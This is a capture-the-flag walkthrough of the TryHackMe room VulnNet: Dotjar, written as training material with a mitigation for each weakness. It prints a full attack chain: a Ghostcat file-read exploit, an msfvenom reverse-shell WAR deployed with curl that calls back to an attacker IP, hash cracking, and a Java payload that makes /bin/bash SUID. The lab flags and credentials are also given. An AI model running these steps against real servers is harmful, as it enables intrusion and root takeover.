# VulnNet: Dotjar CTF Walkthrough

**Target:** VulnNet: Dotjar
**Source:** [TryHackMe](https://tryhackme.com/room/vulnnetdotjar)
**Difficulty:** Medium
**Web Language:** Java
**Target IP:** 10.82.183.211

## Table of Contents
- [Overview](#overview)
- [Reconnaissance](#reconnaissance)
- [Ghostcat (CVE-2020-1938) — Source Disclosure](#ghostcat-cve-2020-1938--source-disclosure)
- [WAR Deployment via Tomcat Manager](#war-deployment-via-tomcat-manager)
- [Local Enumeration & Leaked Shadow Backup](#local-enumeration--leaked-shadow-backup)
- [Cracking the Hashes](#cracking-the-hashes)
- [Foothold via SSH (jdk-admin)](#foothold-via-ssh-jdk-admin)
- [Privilege Escalation via sudo java -jar](#privilege-escalation-via-sudo-java--jar)
- [Room Answers](#room-answers)
- [Vulnerabilities](#vulnerabilities)
- [Attack Chain Summary](#attack-chain-summary)
- [Tools Used](#tools-used)
- [References](#references)

---

## Overview

VulnNet: Dotjar is a medium-difficulty Linux box built around an exposed
Apache Tomcat/AJP stack. The Ghostcat vulnerability (CVE-2020-1938) is used
to read an arbitrary file over the AJP connector before any authentication
is in place, leaking developer credentials straight out of `web.xml`. Those
credentials unlock the Tomcat Manager app, which accepts a malicious WAR
upload for an immediate reverse shell. From there, a world-readable shadow
backup yields a crackable password hash, and a narrowly-scoped `sudo java
-jar *.jar` rule is abused with a custom Java payload to set the SUID bit
on `/bin/bash`, handing over root.

**Key Skills Required:**
- Service enumeration (`nmap`)
- AJP/Ghostcat file-read exploitation (CVE-2020-1938)
- Tomcat Manager WAR deployment (`msfvenom`, `curl`)
- Linux local enumeration and backup-file hunting
- Offline hash cracking (`john`, SHA-512crypt)
- Custom Java payload for `sudo`-scoped privilege escalation

---

## Reconnaissance

### Network Scanning

```bash
nmap -sVC -O 10.82.183.211
```

**Results:**

| Port | Service | Version |
|------|---------|---------|
| 22/tcp | ssh | OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 |
| 8009/tcp | ajp13 | Apache JServ Protocol v1.3 |
| 8080/tcp | http | Apache Tomcat 9.0.30 |

Port 8080 serves only the default Tomcat landing page, so the AJP
connector on 8009 becomes the focus — Tomcat 9.0.30 is in the vulnerable
range for the Ghostcat AJP file-read vulnerability.

---

## Ghostcat (CVE-2020-1938) — Source Disclosure

Two public PoCs are identified; the CVE-2020-1938 variant is used:

```
https://github.com/00theway/Ghostcat-CNVD-2020-10487
https://github.com/xindongzhuaizhuai/CVE-2020-1938   # used here
```

```bash
python2 CVE-2020-1938.py -p 8009 -f WEB-INF/web.xml 10.82.183.211
```

The AJP connector hands back the application's `web.xml` without any
authentication, which contains a plaintext developer credential pair
embedded in its description field:

```xml
<description>
   ...
   Developer access is granted with the credentials provided below:
   webdev:Hgj3LA$02D$Fa@21
   GUI access is disabled for security reasons.
</description>
```

Recovered credentials: `webdev : Hgj3LA$02D$Fa@21`

---

## WAR Deployment via Tomcat Manager

A Java reverse-shell WAR payload is generated:

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<attacker_ip> LPORT=9013 -f war > shell.war
```

Despite the note that "GUI access is disabled," the Tomcat Manager's text
API still accepts authenticated deployments with the leaked credentials:

```bash
curl --upload-file shell.war \
  -u 'webdev:Hgj3LA$02D$Fa@21' \
  'http://10.82.183.211:8080/manager/text/deploy?path=/&update=true'
```

```
OK - Deployed application at context path [/]
```

A listener is started and the root path is visited to trigger the shell:

```bash
rlwrap nc -nvlp 9013
```

```
connect to [<attacker_ip>] from (UNKNOWN) [10.82.183.211] 57220
whoami
web
```

> **Foothold:** `web`

---

## Local Enumeration & Leaked Shadow Backup

`/var/backups` is checked for anything readable by the low-privilege `web`
account:

```bash
cd /var/backups
ls -l
```

```
-rw-r--r-- 1 root root  485 Jan 16  2021 shadow-backup-alt.gz   # we have read permission
-rw------- 1 root shadow 1179 Jan 16  2021 shadow.bak            # root-only
```

The alternate backup (`shadow-backup-alt.gz`) is world-readable and still
contains full shadow entries:

```bash
cp /var/backups/shadow-backup-alt.gz /tmp
cd /tmp
gunzip shadow-backup-alt.gz
cat shadow-backup-alt
```

```
root:$6$FphZT5C5$cH1.ZcqBlBpjzn2k.w8uJ8sDgZw6Bj1NIhSL63pDLdZ9i3k41ofdrs2kfOBW7cxdlMexHZKxtUwfmzX/UgQZg.:18643:0:99999:7:::
jdk-admin:$6$PQQxGZw5$fSSXp2EcFX0RNNOcu6uakkFjKDDWGw1H35uvQzaH44.I/5cwM0KsRpwIp8OcsOeQcmXJeJAk7SnwY6wV8A0z/1:18643:0:99999:7:::
web:$6$hmf.N2Bt$FoZq69tjRMp0CIjaVgjpCiw496PbRAxLt32KOdLOxMV3N3uMSV0cSr1W2gyU4wqG/dyE6jdwLuv8APdqT8f94/:18643:0:99999:7:::
```

Three SHA-512crypt (`$6$`) hashes are recovered: `root`, `jdk-admin`, and
`web`.

---

## Cracking the Hashes

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash --format=sha512crypt
```

```
794613852        (jdk-admin)
```

Only `jdk-admin`'s hash cracks against `rockyou.txt`, but that's enough to
pivot — `root` and `web` remain uncracked.

Recovered credentials: `jdk-admin : 794613852`

---

## Foothold via SSH (jdk-admin)

```bash
ssh jdk-admin@10.82.183.211
```

```bash
jdk-admin@ip-10-82-183-211:~$ cat user.txt
THM{1ae87fa6ec2cd9f840c68cbad78e9351}
```

> **User flag:** `THM{1ae87fa6ec2cd9f840c68cbad78e9351}`

---

## Privilege Escalation via sudo java -jar

```bash
jdk-admin@...:~$ sudo -l
```

```
User jdk-admin may run the following commands on ip-10-82-183-211:
    (root) /usr/bin/java -jar *.jar
```

Any JAR can be executed as root as long as it's invoked through `java -jar`
and matches the `*.jar` glob — this is leveraged to run arbitrary Java code
with root privileges. A minimal payload sets the SUID bit on `/bin/bash`:

```java
package com.reverse.command;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;

public class Main {
    public static void main(String[] args) {
        ProcessBuilder processBuilder = new ProcessBuilder();
        processBuilder.command("/bin/chmod", "+s", "/bin/bash");
        try {
            Process process = processBuilder.start();
            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            String line;
            while ((line = reader.readLine()) != null) {
                System.out.println(line);
            }
            int exitCode = process.waitFor();
            System.out.println("\nExited with error code : " + exitCode);
        } catch (IOException e) {
            e.printStackTrace();
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
    }
}
```

Compiled and packaged on the target:

```bash
javac -d . Main.java
jar cfe Reverse.jar com.reverse.command.Main com/reverse/command/Main.class
sudo /usr/bin/java -jar Reverse.jar
```

```bash
ls -l /bin/bash
```

```
-rwsr-sr-x 1 root root 1183448 Apr 18  2022 /bin/bash
```

With the SUID bit now set, a privileged shell is spawned directly:

```bash
bash -p
```

```
bash-5.0# whoami
root
# cat /root/root.txt
THM{464c29e3ffae05c2e67e6f0c5064759c}
```

> **Root flag:** `THM{464c29e3ffae05c2e67e6f0c5064759c}`

---

## Room Answers

| # | Flag | Value |
|---|------|-------|
| 1 | user.txt | `THM{1ae87fa6ec2cd9f840c68cbad78e9351}` |
| 2 | root.txt | `THM{464c29e3ffae05c2e67e6f0c5064759c}` |

---

## Vulnerabilities

### 1. Ghostcat — Unauthenticated AJP File Read (CVE-2020-1938) (Critical)

**Description:** Apache Tomcat 9.0.30's AJP connector (port 8009) allows
arbitrary file reads inside the web application context with no
authentication, including application config files.

**Impact:** Full disclosure of `web.xml`, which contained developer
credentials in plaintext.

**Mitigation:**
- Upgrade Tomcat past 9.0.31 / 8.5.51 / 7.0.100.
- Disable the AJP connector entirely if it isn't required, or bind it only
  to trusted internal hosts with a shared secret configured.

### 2. Credentials Embedded in Web Application Config (High)

**Description:** `web.xml`'s `<description>` tag contained a plaintext
developer username and password intended for internal reference only.

**Impact:** Direct authentication bypass for the Tomcat Manager app once
the file was disclosed.

**Mitigation:** Never store credentials in application descriptors or any
file bundled with a deployable artifact.

### 3. Tomcat Manager Accepting Arbitrary WAR Deployment (Critical)

**Description:** The Tomcat Manager text API accepted an uploaded WAR
file containing a reverse-shell JSP payload, deployed at the root context.

**Impact:** Remote code execution as the Tomcat service account.

**Mitigation:**
- Restrict Manager app access to trusted IPs only.
- Disable WAR deployment via the Manager interface in production, or
  require stronger authentication (e.g., client certificates).

### 4. World-Readable Shadow File Backup (Critical)

**Description:** `/var/backups/shadow-backup-alt.gz` retained standard
`644` permissions despite containing full `/etc/shadow` content, including
password hashes for `root`.

**Impact:** Offline password cracking against disclosed hashes, leading to
a valid SSH foothold.

**Mitigation:**
- Shadow file backups must carry the same restrictive permissions (`600`,
  root-owned) as the original.
- Audit `/var/backups` and similar directories for permission drift after
  any backup job runs.

### 5. Overly Broad `sudo java -jar *.jar` Rule (Critical)

**Description:** `jdk-admin` could run any JAR file as root via `sudo`, with
no restriction on the JAR's contents or origin.

**Impact:** Arbitrary code execution as root — used here to grant
`/bin/bash` the SUID bit for a direct privilege escalation.

**Mitigation:**
- Never grant sudo rights to general-purpose interpreters or runtimes
  (`java`, `python`, `perl`, etc.) without restricting the exact
  script/JAR path.
- If a specific JAR must run with elevated privileges, pin the rule to an
  absolute, non-writable path rather than a glob.

---

## Attack Chain Summary

```
Nmap scan → SSH, AJP (8009), Tomcat (8080)
    ↓
Ghostcat CVE-2020-1938 → leak WEB-INF/web.xml → webdev credentials
    ↓
msfvenom WAR payload → Tomcat Manager deploy (authenticated) → reverse shell
    ↓
foothold: web → /var/backups → world-readable shadow-backup-alt.gz
    ↓
john --format=sha512crypt rockyou.txt → jdk-admin cracked
    ↓
ssh jdk-admin → foothold, user.txt
    ↓
sudo -l → (root) java -jar *.jar
    ↓
custom Java payload → chmod +s /bin/bash
    ↓
bash -p → root → root.txt
    ↓
Room complete
```

---

## Tools Used

| Tool | Purpose |
|------|---------|
| Nmap | Port scanning and service/OS detection |
| CVE-2020-1938 PoC (Ghostcat) | Unauthenticated AJP file disclosure |
| msfvenom | Java WAR reverse-shell payload generation |
| cURL | Tomcat Manager WAR deployment |
| netcat (nc) / rlwrap | Reverse shell listener |
| John the Ripper | SHA-512crypt hash cracking |
| ssh | Foothold access |
| javac / jar | Custom privilege-escalation payload compilation |

---

## References

- [TryHackMe — VulnNet: Dotjar](https://tryhackme.com/room/vulnnetdotjar)
- [CVE-2020-1938 — NVD (Ghostcat)](https://nvd.nist.gov/vuln/detail/CVE-2020-1938)
- [CVE-2020-1938 PoC (GitHub)](https://github.com/xindongzhuaizhuai/CVE-2020-1938)
- [Ghostcat PoC — 00theway](https://github.com/00theway/Ghostcat-CNVD-2020-10487)

---
